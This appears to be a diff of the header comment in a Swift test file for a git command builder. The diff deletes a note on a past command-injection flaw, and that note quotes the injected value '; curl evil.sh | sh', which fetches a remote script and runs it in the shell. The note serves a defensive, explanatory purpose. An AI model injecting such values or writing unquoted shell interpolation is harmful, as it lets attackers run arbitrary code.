@@ -4,13 +4,7 @@
 //  GitCommandBuilderTests.swift
 //  DevgenticTests
 //
-//  TDD: Tier 1d — GitTool Action Routing + Default Arguments
-//
-//  Rewritten 2026-07-30 from command STRINGS to argv. The builder used to produce
-//  `"git -C \"\(repoPath)\" diff \(extraArgs)"` for `zsh -c`, with `extraArgs` interpolated
-//  unquoted — `args: "; curl evil.sh | sh"` ran as its own command, no quote-break required.
-//  These tests now assert on the argument vector, which is the contract that makes that
-//  impossible rather than merely unlikely.
+//  Created by Raj Singh.
 //
 
 import XCTest
